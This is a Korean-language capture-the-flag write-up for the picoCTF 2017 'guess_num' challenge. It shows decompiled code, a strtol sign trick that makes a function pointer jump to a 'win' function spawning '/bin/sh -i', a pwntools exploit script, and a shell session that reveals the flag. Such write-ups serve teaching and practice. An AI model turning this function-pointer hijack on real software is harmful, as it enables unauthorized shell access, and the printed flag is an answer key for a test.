[바이너리](https://webshell2017.picoctf.com/static/310548ecd55bcf1a15068a582d6971c9/guess_num)

바이너리 파일을 받고 nc 로 접속해서 푸는 문제였다.  
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax@1
  char nptr[4]; // [sp+Ch] [bp-2Ch]@1
  int v6[7]; // [sp+10h] [bp-28h]@2
  int (*v7)(void); // [sp+2Ch] [bp-Ch]@3

  *(_DWORD *)nptr = 0;
  v3 = 0;
  do
  {
    v6[v3] = 0;
    ++v3;
  }
  while ( v3 < 7 );
  setbuf(stdout, 0);
  puts("Welcome to the number guessing game!");
  puts("I'm thinking of a number. Can you guess it?");
  puts("Guess right and you get a shell!");
  printf("Enter your number: ");
  __isoc99_scanf("%32s", nptr);
  v7 = (int (*)(void))strtol(nptr, 0, 10);
  printf("You entered %d. Let's see if it was right...\n", v7);
  v7 = (int (*)(void))((unsigned int)v7 >> 4);
  return v7();
}
```
마지막에 입력한 값을 통해 함수를 불러온다.  
  
BOF로 RET를 덮는게 아닌거 같아  
바이너리를 좀더 살펴보니  
strip 이 없기 때문에  
또다른 사용자정의함수가 눈에 띄었다.  
```
.text:0804852B ; Attributes: bp-based frame
.text:0804852B
.text:0804852B                 public win
.text:0804852B win             proc near
.text:0804852B                 push    ebp
.text:0804852C                 mov     ebp, esp
.text:0804852E                 sub     esp, 8
.text:08048531                 sub     esp, 0Ch
.text:08048534                 push    offset s        ; "Congratulations! Have a shell:"
.text:08048539                 call    _puts
.text:0804853E                 add     esp, 10h
.text:08048541                 sub     esp, 0Ch
.text:08048544                 push    offset command  ; "/bin/sh -i"
.text:08048549                 call    _system
.text:0804854E                 add     esp, 10h
.text:08048551                 leave
.text:08048552                 retn
.text:08048552 win             endp
```
v7() 으로 win함수를 호출하면 되겠다.  
`No PIE`라서 가능했다.  
  
```
    24    v7 = (int (*)(void))((unsigned int)v7 >> 4);
```
호출하기 전(main:24번째 줄)을 보면  
쉬프트연산 때문에  
0x0804852B 에 <<4 를 한 0x804852B0(2152223408) 을 넣어야 했다.  
그런데  
```
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: 2152223408
You entered 2147483647. Let's see if it was right...
Segmentation fault
```
v7 이 2147483647(0x7fffffff) 를 넘어가지 못했다.  
  
```
     1  int __cdecl main(int argc, const char **argv, const char **envp)
...
    21    __isoc99_scanf("%32s", nptr);
    22    v7 = (int (*)(void))strtol(nptr, 0, 10);
    23    printf("You entered %d. Let's see if it was right...\n", v7);
    24    v7 = (int (*)(void))((unsigned int)v7 >> 4);
    25    return v7();
    26  }
```
strtol() 에 대해 검색해보니  
부호가 앞에 올 수 있다는 것을 알았다.  
  
그래서 -1을 입력해보니  
v7=0xffffffff  
이었다.  
  
따라서,  
0xffffffff-(0x804852B<<4)+1 = 2142743888  
이고  
부호 - 만 앞에 붙이면 된다.  
  
```
from pwn import *

r = remote('shell2017.picoctf.com', 64739)
r.recvuntil(': ')
r.sendline('-'+str(0xffffffff-0x804852B0+1))
r.interactive()
```
  
```
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ $ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ $ cat flag.txt
f9ff07fd1d4c7226fd23d998ea2b4b00
$ $
```
